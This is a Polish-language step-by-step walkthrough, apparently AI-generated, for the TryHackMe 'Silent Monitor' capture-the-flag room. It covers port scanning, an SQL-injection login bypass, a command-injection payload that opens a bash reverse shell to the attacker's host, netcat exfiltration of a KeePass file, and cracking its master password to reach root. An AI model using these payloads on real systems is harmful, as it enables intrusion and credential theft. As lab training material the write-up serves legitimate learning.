---

Oto kompletna ściąga (writeup) krok po kroku, która pozwoli Ci rozwiązać pokój **Silent Monitor** na platformie TryHackMe. ==Wyzwanie to polega na udanym połączeniu podatności SQL Injection, Command Injection oraz eskalacji uprawnień przy użyciu bazy KeePass==. [[1](https://medium.com/@duvdeven/tryhackmes-silent-monitor-ctf-walkthrough-779e2807dbb6), [2](https://tryhackme.com/room/silent-monitor), [3](https://medium.com/meetcyber/silent-monitor-breaking-an-internal-flask-application-via-sqli-command-injection-and-adb97c6c9c83)]

---

Krok 1: Rekonesans i skanowanie (Enumeration)

Zaczynamy od standardowego wykrywania otwartych portów, aby zmapować powierzchnię ataku. [[1](https://medium.com/@WHHacker/tryhackme-anonymous-machine-writeup-4c38b09d6c22)]

bash

```
nmap -sC -sV -p- -T4 <TARGET_IP>
```

Używaj kodu z rozwagą.

**Wynik:** Skan ujawnia dwa kluczowe porty: [[1](https://medium.com/@saber22/tryhackme-silent-monitor-writeup-364c1941f905)]

- **22/tcp** – SSH (OpenSSH)

- **5050/tcp** – HTTP (Serwer Werkzeug / Python Flask, portal "CorpNet NOC") [[1](https://medium.com/meetcyber/silent-monitor-breaking-an-internal-flask-application-via-sqli-command-injection-and-adb97c6c9c83), [2](https://medium.com/@saber22/tryhackme-silent-monitor-writeup-364c1941f905)]

---

Krok 2: Rekonesans aplikacji Web (Port 5050)

Po wejściu na stronę `http://<TARGET_IP>:5050` trafiasz na panel logowania. Przeprowadź fuzzer katalogów: [[1](https://medium.com/meetcyber/silent-monitor-breaking-an-internal-flask-application-via-sqli-command-injection-and-adb97c6c9c83)]

bash

```
gobuster dir -u http://<TARGET_IP>:5050/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Używaj kodu z rozwagą.

Podatność 1: SQL Injection (Ominięcie logowania)
dodaj do adresu internal   http://10.128.172.41:5050/internal

Panel logowania jest podatny na **SQL Injection (SQLi)**. Zamiast tracić czas na brute-force, możesz ominąć autoryzację, wpisując w polu użytkownika prosty payload: [[1](https://medium.com/@duvdeven/tryhackmes-silent-monitor-ctf-walkthrough-779e2807dbb6)]

- **Username:** `admin' OR 1=1--` lub `admin' --`

- **Password:** cokolwiek (np. `password`)

Po zalogowaniu zyskujesz dostęp do wewnętrznego dashboardu narzędzi sieciowych (NOC). [[1](https://medium.com/@saber22/tryhackme-silent-monitor-writeup-364c1941f905), [2](https://medium.com/@duvdeven/tryhackmes-silent-monitor-ctf-walkthrough-779e2807dbb6)]

---

Krok 3: Uzyskanie dostępu (Foothold via Command Injection)

Na dashboardzie znajduje się narzędzie diagnostyczne (np. ping lub traceroute). To klasyczne miejsce na sprawdzenie podatności **Command Injection**. [[1](https://medium.com/@saber22/tryhackme-silent-monitor-writeup-364c1941f905), [2](https://medium.com/@duvdeven/tryhackmes-silent-monitor-ctf-walkthrough-779e2807dbb6)]

- Wprowadź testowy payload rozdzielający komendy (np. `127.0.0.1; whoami` lub używając URL-encode `127.0.0.1%0aopenssl...`).

- Przygotuj nasłuchiwanie na swojej maszynie (AttackBox/Kali):
    
    bash
    
    ```
    nc -lvnp 4444
    ```
    
    Używaj kodu z rozwagą.

- Wyślij payload wywołujący reverse shell (zmodyfikuj IP na swój adres z VPN THM):
    
    bash
    
    ```
    127.0.0.1; bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1'
    ```
    
    Używaj kodu z rozwagą.

- Po przejęciu sesji ustabilizuj powłokę:
    
    bash
    
    ```
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    ```
    
    Używaj kodu z rozwagą.
    
    [[1](https://medium.com/@saber22/tryhackme-silent-monitor-writeup-364c1941f905)]

W katalogu domowym użytkownika (np. `/home/sysadmin`) znajdziesz plik **user.txt** z pierwszą flagą. [[1](https://medium.com/@saber22/tryhackme-silent-monitor-writeup-364c1941f905), [2](https://medium.com/@duvdeven/tryhackmes-silent-monitor-ctf-walkthrough-779e2807dbb6)]

---

Krok 4: Eskalacja uprawnień (Privilege Escalation do Root)

Podczas przeszukiwania plików systemowych (szczególnie ukrytych lub w katalogu użytkownika) natrafisz na plik bazy danych haseł **KeePass** o nazwie **infrastructure.kdbx**. [[1](https://medium.com/@saber22/tryhackme-silent-monitor-writeup-364c1941f905)]

1. Eksfiltracja pliku `.kdbx`

Prześlij plik na swoją maszynę lokalną.

- _Na maszynie ofiary:_
    
    bash
    
    ```
    nc -w 3 <YOUR_IP> 1234 < infrastructure.kdbx
    ```
    
    Używaj kodu z rozwagą.

- _Na maszynie lokalnej:_
    
    bash
    
    ```
    nc -lvnp 1234 > infrastructure.kdbx
    ```
    
    Używaj kodu z rozwagą.

2. Łamanie hasła głównego KeePass

Użyj narzędzia `keepass2john`, aby wyciągnąć hash z bazy danych, a następnie złam go za pomocą `John the Ripper` i słownika RockYou: [[1](https://medium.com/@duvdeven/tryhackmes-silent-monitor-ctf-walkthrough-779e2807dbb6)]

bash

```
keepass2john infrastructure.kdbx > keepass.hash
john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash
```

Używaj kodu z rozwagą.

**Wynik:** Po chwili `john` wyświetli poprawne hasło do bazy danych.

3. Odczytanie haseł i przejęcie konta Root

- Otwórz plik `.kdbx` na swojej maszynie za pomocą narzędzia `kpcli` lub graficznego programu `KeePassXC`.

- Wpisz złamane hasło główne.

- Wewnątrz bazy danych znajdziesz zapisane dane uwierzytelniające dla użytkownika **root**. [[1](https://medium.com/@duvdeven/tryhackmes-silent-monitor-ctf-walkthrough-779e2807dbb6)]

Z powrotem w powłoce na maszynie ofiary (lub logując się bezpośrednio przez SSH na konto sysadmin/root), przełącz się na najwyższe uprawnienia: [[1](https://medium.com/@saber22/tryhackme-silent-monitor-writeup-364c1941f905)]

bash

```
su - root
```

Używaj kodu z rozwagą.

Wpisz hasło znalezione w bazie KeePass. Druga flaga znajduje się w `/root/root.txt`. [[1](https://medium.com/@saber22/tryhackme-silent-monitor-writeup-364c1941f905), [2](https://medium.com/@duvdeven/tryhackmes-silent-monitor-ctf-walkthrough-779e2807dbb6)]

---

Jeżeli utkniesz na którymś z kroków, daj znać! Czy potrzebujesz dodatkowych informacji o **dokładnym formacie payloadu SQLi** czy **sposobie stabilizacji terminala**?
